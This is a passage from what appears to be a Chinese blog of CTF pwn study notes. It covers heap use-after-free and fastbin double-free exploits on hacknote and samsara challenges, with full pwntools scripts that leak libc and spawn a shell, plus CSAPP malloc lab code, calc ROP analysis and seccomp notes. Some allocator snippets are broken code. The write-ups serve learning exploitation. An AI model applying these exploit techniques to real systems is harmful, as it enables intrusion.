（然后发现fastbin是空的，free chunk跑Tcache了，有一点尴尬） ​ ​ 问题不大，pwndocker好处就体现在此。 ​ 可以看到两个note的四个堆块都被free了。并且处在不同的空闲链表中，但是这不是重点。 ​ 可以看到，被free的四个chunk的内存地址是连续的，所以当我们申请一个size为8的note2时，malloc会在空闲链表中寻找符合的free chunk，并且由于0x10和0x28的free chunk是分别的两条空闲链表，所以malloc会直接在0x10的链表中寻找，并从链表中取出尾部的free chunk，也就是刚才被释放的note1的指针chunk。 ​ fastbin的0x10中的两个free chunk都被分配了，一个储存指针，一个储存content。位置分别是0x5695c038和0x5695c0300。 ​ 也就是说，note2的content chunk，实则被分配到了note0的指针chunk的内存空间，而原本在这里储存的是note0的*put和 *content，也就是说，如果我们此刻执行print(note0),那么程序就会将执行函数与 *put指向的地址的操作绑定执行put。 ​ 此刻我们的*put指向的是cccc，那么我们只要把它换成后门函数地址，就能够getshell。 ​ 完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *#libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27999)else: &#x27;&#x27;&#x27;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./hacknote&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)#p = process(&#x27;./&#x27;)magic = 0x08048986def add(size,content): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;Note size :&#x27;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.send(content)def free(idx): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;2&#x27;) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx))def put(idx): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;3&#x27;) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx))add(0x20,b&quot;a&quot;*0x8)#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]add(0x20,b&quot;a&quot;*0x8)#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]free(1)#main_arena 0x10:=&gt; chunk1_print(0x10) # 0x20:=&gt; chunk1_content(0x20)free(0)#main_arena 0x10:=&gt; chunk0_print(0x10) =&gt; chunk1_print(0x10) # 0x20: =&gt; chunk0_content(0x20)=&gt; chunk1_content(0x20)&#x27;&#x27;&#x27;fastbin:main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)&#x27;&#x27;&#x27;add(0x8,p32(magic)*2)#chunk2, point to chunk0_print(0x10) and chunk1_print(0x10)put(1)gdb.attach(p)p.interactive() pwnable_hacknote​ 好，写了很多。然后再稍微加强一点，来看pwnable.tw上的hacknote。 ​ 题目链接 ​ 源码和hitcon lab相比就是缺少了后门函数，需要ret2libc。直接利用之前的思路，将*put覆盖为print的地址和puts的got表，泄露puts的虚拟地址，然后经典ret2libc，拿到ststem的地址，传参的话还是一样的思路。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;, &quot;./hacknote&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/ctf/work/work/challenge/pwnable/hacknote/libc_32.so.6&quot;&#125;)r = remote(&#x27;chall.pwnable.tw&#x27;,10102)libc = ELF(&quot;./libc_32.so.6&quot;)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)#context.log_level = &quot;debug&quot;print_addr = 0x804862bputs_got = 0x804A024def addnote(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))#gdb.attach(r)magic = 0x08048986addnote(32, &quot;yuuu&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8,p32(print_addr)+p32(puts_got))printnote(0)puts_addr = u32(r.recv(4))print(hex(puts_addr))libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]system_addr = libc.symbols[&#x27;system&#x27;] - libc_basedelnote(2)addnote(8,flat([system_addr,&quot;||sh&quot;]))#gdb.attach(r)printnote(0)r.interactive() FastbinDoubleFree​ ​ 关于fastbin attack，利用其实非常的简单，就是使得被二次释放的chunk不与main_arena直接指向就行。这样就会造成被二次释放的chunk被再次插入空闲链表，使得下一次申请合适size的chunk时会申请到被二次释放的chunk，而chunk的fd又能够随意修改，造成任意地址写与执行。 ​ 从数据结构的角度看，fastbin与其他bin不太一样的就是，它是由单向链表管理，chunk只有一个fd，链表头为main_arena（关于这里一直不太理解main_arena是怎样管理所有bin并通过它得到bin的偏移的），新free的chunk会被插入表头，而取出时遵循的是frist fit原则，也就是从头开始检查，并取出第一个符合条件的chunk。 ​ 高效，但是势必会造成一定的fragment，但是由于fastbin chunk本身的size足够小，所以可以忽略。 ​ 例子来源于之前做过的一些题： metasequoia_2020_samsara​ 题目链接 ​ 逻辑比较好逆，如果v8等于deadbeef就能getshell。 ​ ​ 然后变量的栈布局是这样的 ​ ​ 可以看到v7和v8只差了8字节，如果能够溢出或者其他操作将v8修改就能拿到flag。然后从上面的逻辑我们知道v7的真实地址，以及我们能够对v7对地址写入任意内容。当然这里不能像栈溢出那样直接溢出v7，将内容写入v8.（具体的原因我其实不是很清楚，是有溢出的检测还是啥捏)，而是需要利用某种方式使得能够任意地址i写 ​ 然后又已知这道题的考点是fastbin double free，这个利用方式正好能造成任意地址写。 ​ 那么思路大概是 1234567add chunk0add chunk1add chunk2#防止free chunk被top chunk合并free chunk0free chunk1free chunk0 ​ 此刻fastbin链表大致如下： 1main_arena =&gt; chunk0 =&gt; chunk1 =&gt;chuk0 ​ 然后此时再 12345add chunk3 #申请到的是chunk0的内存空间edit chunk3#在fd位填入v8的地址（可以通过打印v7的地址获得）然后链表大概长这样：main_arena =&gt; v8 =&gt;chunk1 =&gt;chunk0（这里是错的，后面有更正）所以此时只要再add chunk3，就能申请到v8的内存空间，并进行任意写。 ​ 然后就可以直接写exp了；def部分是直接复制我以前做的时候的exp，那个exp又是我不知道从哪里复制过来的qwq。 ​ （话说上次看大佬写的calc的exp，突然觉得就算是简单的py脚本也能够写得非常抽象捏，什么类型转换数组处理还有各种循环看得我头疼捏，真离谱捏。） ​ （写exp的时候发现一个非常畸形的问题，就是我的delete函数无论怎样都会报错，但是先进的vscode完全没有给我一个合理的错误解释，后来在容器中执行了才给我一条有价值的报错。大概就是因为原本的exp的tab和空格混用了，改一下就行，其实之前也遇到过类似的问题，但是当时没有完全意识到问题所在并且不知道为什么就解决了所以没有留下印象） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *#p = process(&#x27;./metasequoia_2020_samsara&#x27;)#p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;, &quot;./metasequoia_2020_samsara&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)p = remote(&#x27;node4.buuoj.cn&#x27;,27450)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)#context.log_level = &quot;debug&quot;elf = ELF(&#x27;./metasequoia_2020_samsara&#x27;)def add(): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;1&#x27;)def dele(idx): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;2&#x27;) p.sendafter(&#x27;:&#x27;,str(idx))def edit(idx,content): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;3&#x27;) p.sendafter(&#x27;:&#x27;,str(idx)) p.sendafter(&#x27;:&#x27;,content)def show(): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;4&#x27;)def move(dest): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;5&#x27;) p.sendafter(&#x27;?&#x27;,str(dest))#double freeadd()#0add()#1dele(0)dele(1)dele(0)#gdb.attach(p)add()#2--&gt;0add()#3 --&gt;1move(0x20)show()#get the addr of v7v7_addr = u64(p.recv(8))v8_addr = v7_addr - 8edit(2,p64(v8_addr))edit(3,&quot;0xDEADBEEF&quot;)p.sendlineafter(&quot;choice &gt;&quot;,&#x27;6&#x27;)p.interactive() ​ 打不通，并且因为未知原因（大概率是elf头的ld不匹配），导致本地无法调试，去网上搜了一下wp，发现有这么几个个细节我没有注意，或者说想错了。 ​ 在进行double free的时候，我只预先申请了两个chunk，并且将前一个申请的chunk double free了。但是wp预先申请了三个chunk，然后我意识到，第三个申请的chunk很有可能是防止之前被free的两个chunk被top chunk合并，之前刷堆题的时候经常碰到这一点，但是太久没做了，有些忘了。这里是没有注意到的细节。 ​ 然后是想错了的部分，可以看到我之前的wp中的思路是这样的： ​ 错误所在就是，修改free chunk0的fd之后，它在fastbin中的位置应当还是 main_arena =&gt; chunk1 =&gt;chunk0(v8) ，也不知道为什么我会以为新的fd会被重新插入链表。 ​ 然后按照first fit原则，我们连续add两个chunk，就能够申请到v8的内存空间了。后面的内容就问题不大了。 ​ 所以更正后的exp大概是这样： 12345678910111213141516171819add()#0add()#1add()#2,防止与top chunk合并dele(0)dele(1)dele(0)#gdb.attach(p)add()#3--&gt;0add()#4 --&gt;1move(0x20)show()#get the addr of v7v7_addr = u64(p.recv(8))v8_addr = v7_addr - 0x8edit(3,p64(v8_addr))add()#5add()#6edit(6,0xDEADBEEF) 总结​ 感觉每个入门堆题的人首先开始做的题目都是fastbin attack以及UAF，因为确实相对来说简单易懂。但是反观我半年前写的fastbin attack的wp，我的评价是：狗屁不通。 ​ 所以我对于堆题，或者是整个ctf pwn的学习其实是走了很多弯路的。比如说对于动调的惧怕，导致我做了很多题，但又没完全做。比如我学习堆题，却不愿意沉下心来，从了解ptmalloc开始，而是摁刷题，导致知识点被割裂得完全串联不上，学完就忘。现在从csapp malloc lab开始逐步琢磨glibc，然后睡前再看半个小时源码剖析，再辅以ctf pwn的一些题目的分析，对于各种知识点好歹是有了一个足以将它们串联起来的体系，从而做题是不再那么一头雾水了。如果在半年前我能意识到这一点就好了。但是我还是觉得任何在pwn学习过程中踩过的坑，无论是知识点本身的坑，还是学习方案上的坑，都是宝贵的，无可替代的学习经验捏。","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"learning","slug":"learning","permalink":"https://fuurinko.github.io/tags/learning/"}]},{"title":"csapp malloc lab","slug":"mess_malloc_lab","date":"2021-12-03T08:46:22.570Z","updated":"2022-04-15T08:29:41.227Z","comments":true,"path":"2021/12/03/mess_malloc_lab/","link":"","permalink":"https://fuurinko.github.io/2021/12/03/mess_malloc_lab/","excerpt":"","text":"0）前言​ 鸽了三个月的malloc lab，作为复习堆题的开始。 ​ 计画完成时间是12.5之前，也就是三天。 1）大体设计​ 对于整体的操作的大致模型以及allocater和freer需要做的工作如下： ​ 分配器： 在第一次分配chunk时，对堆空间进行初始化=&gt;mm_init() 创建指定类型的chunk。 ​ free 利用隐式空闲链表，将free状态的chunk链接。 利用合适的机制，对物理地址相邻的free chunk进行合并 利用合适的机制，在分配器有需求的时候分割相对应的free chunk，并将其标识为allocated。 ​ 其他的驱动代码以及头文件已经给出，我们只需在mm.c中进行编写。 ​ 在这个模型中，分配器的分配的chunk的结构大致如下，运用带边界标记的chunk使堆块合并更加优雅。 ​ ​ 2）利用宏定义简化指针操作​ 为了简化在操作chunk在链表中的一些与指针相关的行为，我们可以定义一系列宏来将这些操作打包，使得代码更为简洁，同时一些基本的常数也将被定义。 ​ ​ ​ 3）level·1​ level1利用隐式空闲链表+首次/下一次/最佳适配三种方式实现。 first_fitmm_init()​ 首先是mm_init()函数，利用mm_sbrk()创建一个4字的空闲链表，将链表第一个双字的首尾分别标记为序言块的header和footer，然后将第三个字标记为结尾块，然后调用extend_heap()函数初始化堆空间。被初始化的size为CHUNKSIZE/WSIZE也就是1*10^12 / 4。 ​ 然后是extend_heap()函数，利用mm_sbrk()创建size大小的空间，size由之前初始化的size决定。并且将整个空chunk的对应位标记头和脚部。最后，在很可能出现的前一个堆以一个空闲块结束的情况，我们调用coalesce函数来合并两个空闲块 ，并返回指向合并后的块的块指针。coalesce函数将在后面的部分被详细分析。 mm_malloc()​ 堆空间初始化之后，我们首先设计mm_malloc()。 ​ 函数大致功能是： 检查请求真假，然后准备分配chunk 调整chunk size，在请求size的基础上加入8字节的对齐和8字节的chunk头和chunk脚。也就是说，一个chunk至少会有16字节。 在free list中寻找符合size要求的chunk。 如果没有在free list中找到，则直接调用extend_heap() 生成对应的空间。 ​ 这里csapp没有为我们提供find_fit()以及place()的例子,需要我们自己编写。我们先放着，之后再来讨论。 mm_free()​ mm_malloc()之后，我们来看mm_free() ​ 它被用来释放已被分配的chunk，相当于释放malloc所请求的bp，然后需要将被释放的chunk与其物理领接的free chunk合并。 ​ ​ coalesce()​ 重点来看coalesce() ​ 这里用到的合并方式的构思图表如下： ​ ​ 也是非常地直观容易理解。 ​ 它的代码实现也直观地被分为如图四种情况，所以我们先要定义对应图中几种状态的bp状态。 123size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp))); size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp))); size_t size = GET_SIZE(HDRP(bp)); ​ 大致框架如下： ​ find_fit()​ 整个malloc lab的重点，需要自己实现一个free chunk的适配寻找。 ​ 一些常见的方法有 首次适配 下一次适配 最佳适配 分离式（复杂） ​ 其实这些并不是完全先进或者落后，各有各的优缺点。在这里为了简单我们选择首次适配，即使用在free list中找到的第一个符合条件的chunk。 ​ 按照首次适配的原理，我们的思路是，从头到尾搜索链表，如果遇到合适的free chunk，则按照size将其头和尾部标记。 ​ 实现大致是： ​ 指定一个size，在链表中通过判断头部inuse位，找到第一个free chunk的bp,，然后计算next bp是否大于bp + size ,且状态为free，如果是，将bp标记为allocated，在bp+size的地方标记为footer，分割该chunk，虽然会留下一定的碎片，但这也是首次适配无法避免的缺点。如果不是，则继续寻找下一个free chunk并判断。 ​ 然后来研究代码实现： ​ 自己瞎写了一个，问题不大。 place()​ 函数功能是将请求块放置在空闲块的起始位置，只有当剩余部分的大小等于或者超出最小块的大小时，才进行分割。 12345678910111213141516static void place(void *bp, size_t asize)&#123; size_t size = GET_SIZE(HDRP(bp)); if ((size - asize) &gt;= (2*DSIZE)) &#123; PUT(HDRP(bp),PACK(asize,1)); PUT(FTRP(bp),PACK(asize,1)); PUT(HDRP(NEXT_BLKP(bp)),PACK(size - asize,0)); PUT(FTRP(NEXT_BLKP(bp)),PACK(size - asize,0)); &#125; else &#123; PUT(HDRP(bp),PACK(size,1)); PUT(FTRP(bp),PACK(size,1)); &#125;&#125; 问题不大 next_fit​ 下一次适配，主要特点是在第一次在空闲链表中找到合适的chunk以后，下一次搜索就不再是从头到尾，而是从上一次搜索的chunk开始继续搜索。 ​ 相比于首次适配，写循环时就不能嗯搞，要处理第一次找到fit chunk后的状态。大致的思路是：先按照首次适配的方式找到第一个适合的chunk，然后记录下chunk的bp，下一次寻找时则从记录的bp开始寻找。 ​ 那么肯定需要定义一个外部变量来记录每次找到的bp。 1234567891011121314151617181920212223242526272829static void *next_find_fit(size_t asize)&#123; char * bp = heap_listp; size_t ALLOC_STATUS; size_t SIZE; while (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; 0) &#123; if(mark_bp) &#123; bp = NEXT_BLKP(mark_bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue; mark_bp = bp; return bp; continue; &#125; bp = NEXT_BLKP(bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue; mark_bp = bp; return bp; &#125; return NULL;&#125; ​ 问题不大。 best_fit​ 搜索链表中的每一个堆块，选择符合条件的最小空闲块。目前来说思路是这样的： ​ 对整个堆空间进行搜索，标记合适的chunk，并将size储存在数组中，在搜索结束后进行排序，选择最适合的chunk，并将bp返回。 ​ 对堆空间进行搜索，大概只需要在原本的算法上去掉结束循环的判定条件。然后排序的话随意找个排序算法来就行，图方便我复制了一个冒泡排序，虽然时间复杂度不太行。 ​ 但是存在一个问题就是，排序肯定是以chunk的size为标准，但是如何关联size和bp呢？我将所有符合条件的chunksize排序之后，如何找到对应的bp？ ​ 一个比较直观的解决方法就是二维数组，将bp和size同时存放，同时排序，当然也许可以使用类似PACK的宏，或者为每一个size增加一个idx，也是二维数组的思路，但是并不是直接将bp存放，而是存放bp的idx。 ​ 考虑到二维数组排序有一些麻烦，故直接定义结构体来存放size与bp的idx。 12345678910111213141516171819202122232425262728static void *best_find_fit(size_t asize)&#123; char * bp = heap_listp; size_t ALLOC_STATUS; size_t SIZE; struct bp_list list[]; while (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; 0) &#123; for ( int i = 0; i &lt; CHUNKSIZE/WSIZE; i++) &#123; bp = NEXT_BLKP(bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue list[i].bp_size = GET_SIZE(HDRP(bp)); list[i].bp_idx = i; list[i].bp = HDRP(bp); &#125; bubble_sort(int list[i].bp_size,int i); return list[i].bp; &#125; return NULL;&#125; 4) level2​ level2利用显式链表和分离适配来实现，同时这种方法也是非常接近ptmalloc2的，所以学习这种方法的思想是十分必要的。 数据结构显式空闲链表​ 相比于隐式空闲链表没有实际的链表去管理空闲块，显式空闲链表使用新增的双向循环链表，通过在chunk头添加指向逻辑上相邻的chunk的指针来相互连接。显式链表为chunk指针操作增添了更多姿势，突破了隐式性能的局限性。当然这个方案也不是完全没有缺点，为了包含指针和可能的脚部，显式空闲链表的chunk通常会更大一些，潜在地提高了内存碎片的程序。 chunk​ 显式链表chunk结构如图： ​ 有点类似ptalloc的机制，当chunk为allocated状态，中间为padding，当为free状态，会在padding开始前，也就是之前方案中的bp指向的地方增添两个指针：next_bp， prev_bp。 First_fit​ 因为确实不太会写，所以基本算是照着代码分析思路了。 ​ 首先是完成显式空闲链表下first_fit的实现，这种方案目的是熟悉如何通过创建一个双向循环链表来管理空闲块。 ​ 第一步是创建空闲链表。 ​ ​ 显式链表下的free()也和隐式空闲链表没区别，都是把chunk 头的size置0，但是多出来了 12SET_PREV(bp, 0);SET_NEXT(bp, 0); ​ 也就是先将需要free的chunk的fd和bk位全部设置为0，然后进行合并后放入空闲链表。 然后编写将chunk插入和取出双向循环链表的操作。 insert_from_free_list()​ 将已分配块释放，chunk bp 被插入free list。 remove_from_free_list()​ 在free list中拿出chunk。与隐式链表类似，分为四种情况。因为是双向循环链表，所以解链的过程也可以理解为unlink。 ​ 第一种情况：prev == NULL &amp;&amp; next == NULL，chunk前后都是allocated chunk，双向链表中啥也没有，设置表头为空。 ​ 第二种情况：prev == NULL ，前一个chunk为allocated，前一项为空，说明此时chunk的前面没有chunk，那么bk本身就是空的，解链就需要设置fd为空，也就是next为0。 ​ 第三种情况同理。 ​ 第四种情况：chunk前后都有free chunk，那么解链相当于一个标准的unlink，就是将前一个chunk的bp的next位设置为下一个chunk的bp，然后下一个chunk的prev位设置为前一个chunk的bp。 分离适配​ 分离适配的特点就是利用很多储存不同大小范围的chunk的链表来管理free chunk，很大程度上减小了内存碎片的产生。 ​ 根据参考资料，我们可以将大小以2^n划分。 ​ ​ 5）结果与改进​ ​ 6）反思与思考​ 本来应该是在今年暑假就要完成的东西，因为太过懒散而拖到了现在。不得不说如果沉下心来做，这个lab其实不算很难，最难的实际上是对这个简单的内存分配器从0到逐渐熟悉架构的过程。如果不去认真读csapp，了解程序的大致架构的话，就会一头雾水从而放弃，暑假便是因此。 ​ 其实大多数代码并不需要自己完成，也是确实没有这个水平，但是也有我们自己需要思考，然后实现的地方，就比如说适配的方法。我从来没有学过数据结构或者算法，也没有刷过类似的题，c语言也就是局限于看得懂这样的普通计算机专业学生水平，对于这种大面积的指针操作一时确实有些摸不着头脑，但是csapp给了我们一种解：利用宏，将复杂的指针运算以及强制类型转换封装，变得简单易用，这使得在我操作指针时，几乎感受不到指针的复杂所在，也是我觉得收获最大之所在。 ​ 关于三种适配方法，第一种我在编写时并不太理解如何实现“继续寻找下一个chunk”，于是自己按照感觉写了一个版本，然后寻找了一些参考，发现我写的除了这一步，其他都问题不大，然后就把自己的版本修正了。之后的两种适配方法都是基于首次适配的代码加以适当的条件修改而成，不得不说其实十分有趣。最佳适配牵涉到数组的排序以及结构体的定义，说实话上一次编写带结构体的c程序还是上学期起哦期末的暑假考核，但是也没有遇到什么障碍，就这么顺着写了。现在想来我们大一上的c语言大作业真是简单捏。 ​ 7）参考​ 六 Malloc Lab ​ CSAPP:Lab5-Malloc Lab","categories":[{"name":"CSAPP LAB","slug":"CSAPP-LAB","permalink":"https://fuurinko.github.io/categories/CSAPP-LAB/"}],"tags":[{"name":"csapp lab","slug":"csapp-lab","permalink":"https://fuurinko.github.io/tags/csapp-lab/"}]},{"title":"openstack学习笔记","slug":"other_openstack学习笔记","date":"2021-11-22T08:56:23.363Z","updated":"2022-04-09T08:37:14.903Z","comments":true,"path":"2021/11/22/other_openstack学习笔记/","link":"","permalink":"https://fuurinko.github.io/2021/11/22/other_openstack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"​ ​ 为了跟上网校的集群重构计划，这下狠狠地开始学习运维了。 ​ 在开始具体的openstack学习之前，首先需要学习一下一些基本的运维概念。 虚拟化/容器化​ 之前在学习docker的时候对于容器化已经有一个比较到位的认知了，而与容器化相对应的虚拟化并没有深入理解。 ​ 这里的虚拟化特指服务器虚拟化。就是在一台服务器上运行虚拟运行多个服务器。 虚拟化分类完全虚拟化​ 利用Hypervisor，将硬件与软件完全隔离，性能较差。 准虚拟化​ 改动操作系统，使操作系统以为自己是独立的。 操作系统层虚拟化​ 改动操作系统，使主机成为虚拟机管理软件。 桌面虚拟​ 不讨论 硬件虚拟​ 虚拟硬件而不是虚拟操作系统。 虚拟化技术分类​ ​ ​ ​ ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"SRE","slug":"SRE","permalink":"https://fuurinko.github.io/tags/SRE/"}]},{"title":"pwnable-calc","slug":"stack_challenge_pwnable-calc","date":"2021-11-18T02:30:24.678Z","updated":"2022-04-09T08:37:30.945Z","comments":true,"path":"2021/11/18/stack_challenge_pwnable-calc/","link":"","permalink":"https://fuurinko.github.io/2021/11/18/stack_challenge_pwnable-calc/","excerpt":"","text":"逆向​ 程序实现了一个简单的计算器功能。运算有加减乘除四种。 ​ ​ 并且程序再次自带计时功能，需要patch。 ​ ​ 静态链接，所以肯定不能用ret2libc那一套，只能试图ROP一下。 ​ 程序主要功能通过get_expr和calculate（原本不叫这个）两个函数实现。 ​ get_expr主要用于定位我们输入的字符串中运算符的位置。修改过的ida伪代码如下: 1234567891011121314151617181920212223int __cdecl get_expr(int input_str, int _1024)&#123; int idx_0; // eax char operator; // [esp+1Bh] [ebp-Dh] int i; // [esp+1Ch] [ebp-Ch] i = 0; while ( i &lt; _1024 &amp;&amp; read(0, &amp;operator, 1) != -1 &amp;&amp; operator != &#x27;\\n&#x27; ) //栈溢出 &#123; if ( operator == &#x27;+&#x27; || operator == &#x27;-&#x27; || operator == &#x27;*&#x27; || operator == &#x27;/&#x27; || operator == &#x27;%&#x27; || operator &gt; &#x27;/&#x27; &amp;&amp; operator &lt;= &#x27;9&#x27; ) &#123; idx_0 = i++; *(_BYTE *)(input_str + idx_0) = operator; // 通过循坏找到运算符的位置 &#125; &#125; *(_BYTE *)(i + input_str) = 0; return i; ​ 在这之后还有一个init_pool函数。函数参数为表达式数组的索引。大致就是初始化一个大小的100的字符串数组。 ​ calculate函数则负责进行运算。 ​ 实在是没有思路，于是找到了wp。不得不说pwnable.tw上面的题目每个都出得很好，几乎没有板子题，而且漏洞点都丝毫不传统。 ​ 主要的问题还是在这个运算的逻辑上 123456789101112131415161718192021222324252627DWORD *__cdecl eval(_DWORD *num, char operator)&#123; _DWORD *result; // eax if ( operator == &#x27;+&#x27; ) &#123; num[*num - 1] += num[*num]; &#125; else if ( operator &gt; &#x27;+&#x27; ) &#123; if ( operator == &#x27;-&#x27; ) &#123; num[*num - 1] -= num[*num]; &#125; else if ( operator == &#x27;/&#x27; ) &#123; num[*num - 1] /= num[*num]; &#125; &#125; else if ( operator == &#x27;*&#x27; ) &#123; num[*num - 1] *= num[*num]; &#125; result = num; --*num; return result;&#125; ​ 这里*num，也就是num[0]的值，是检测到的表达式中数字的数量。 ​ 比如我输入了1+2，那么，num[0]的值为2，如果输入+2，num[0]的值为1。 ​ 所以根据这个计算的逻辑，如果输入+50，num[0]是1，num[1]是50，num[*num-1]就是num[1-1] = num[0] = num[0] + num[1]=50。 ​ 如果输入的是+50+1，处理第一个加号时，num[0] = 2,num[1] = 50 ,num[2].= 1， 然后num[1] += num[2] =&gt; num[1] = 51，接着处理第二个加号，也就是,num[50] += num[51]。 ​ num[51]显然应该是一个栈上的还没有被利用到的位置，但是这样我们已经能够将其覆盖为任意内容了，四舍五入形成了一个栈上任意地址读。 ​ 然后后面还有一个对数组的内容的输出，相当于栈上任意地址写。 ​ 这样我们就找到了不通过栈溢出而对栈上地址进行任意读写的方法，但想要控制程序执行流，我们注意到，存放进行计算的数字的数组不算很大，完全能够填写东西覆盖返回地址。 ​ ​ ​ ​ ​ 也就是0x5A0 + 0x4 = 0x5A4 = 1444。数组存放int类型，32位下一个int占4个字节，所以返回地址所在的位置是idx[1444/4=361] ​ 也就是说如果我们能够将想要的东西写入idx[361]就能控制程序执行流。但是并不能ret2libc，所以需要在栈上手动构造寄存器状态来进行系统调用。 ​ 所以我们需要的并不是在idx[361]上填某个值，而是需要连续修改这之后一串的空间来进行rop。 ​ 借一张图来表示我们需要的布栈状况： ​ ​ ​ 其他的gadgets都可以通过ROPgadget来找到，但是字符串&quot;/bin/sh&quot;需要输入并确定它们在栈上的地址。 ​ ​ ​ 对于这个地址，首先我们可以利用我们之前的栈上任意地址读写的能力泄露calc函数的ebp地址，也即是idx[360] ,但是我们需要的字符串是在main函数调用栈中的，所以我们需要知道main函数调用栈的esp。 ​ 通过观察可以发现main的esp正好就是idx[361],而calc ebp和main esp的关系如下： 123 mov ebp, esp and esp, 0FFFFFFF0hsub esp, 10h ​ 也即是我们可以通过calc ebp的值来求出main esp，从而通过偏移获得&quot;/bin/sh&quot;的地址。 ​ 然后根据布栈将地址依次写入栈中就行。","categories":[{"name":"STACK - ROP","slug":"STACK-ROP","permalink":"https://fuurinko.github.io/categories/STACK-ROP/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"Seccomp机制学习","slug":"stack_learning_Seccomp机制学习","date":"2021-11-11T13:12:47.210Z","updated":"2022-04-09T08:32:02.374Z","comments":true,"path":"2021/11/11/stack_learning_Seccomp机制学习/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/stack_learning_Seccomp%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1）Seccomp基础Seccomp简介​ 就像ALSR，NX这样，Seccomp也是linux内核的一种安全机制。这种保护机制会禁用某些系统调用，有效避免了越权行为的发生。 启动Seccomp​ 如果要编写调用Seccomp的程序，需要先安装相应的头文件。 1apt install libseccomp-dev libseccomp2 seccomp Seccomp的模式以及参数比较多，这里只总结比较直观的几点，具体的可以看大佬的博客：seccomp学习笔记 123456789 scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_ALLOW);/* SCMP_ACT_ALLOW表示在初始化的时候允许所有系统调用，相反的 SCMP_ACT_KILL表示禁用所有系统调用*/ seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);//添加一条seccomp规则，第二个参数选择禁用/开启（kill为禁用，allow为开启）第三个参数表示规则处理的具体的系统调用，第四个参数是限制系统调用执行的参数，如果不为0，那么后面会加上更具体的限制系统调用参数的函数参数） seccomp_load(ctx);//调用，使过滤规则生效 2）Seccomp-Tools​ 暂时空着，因为我seccomp dump，系统给我说无权限。这个问题似乎仅限于docker，但是网上并没有类似的烈士为我答疑解惑捏。 3）ORW例题pwnable-orw​ pwnable第二题，orw。 ​ ​ ​ 这里的沙箱实际是通过prctl来控制实现的。 (1).PR_SET_SECCOMP(22)：当第一个参数是PR_SET_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigereturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock_fprog结构体定义，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图) 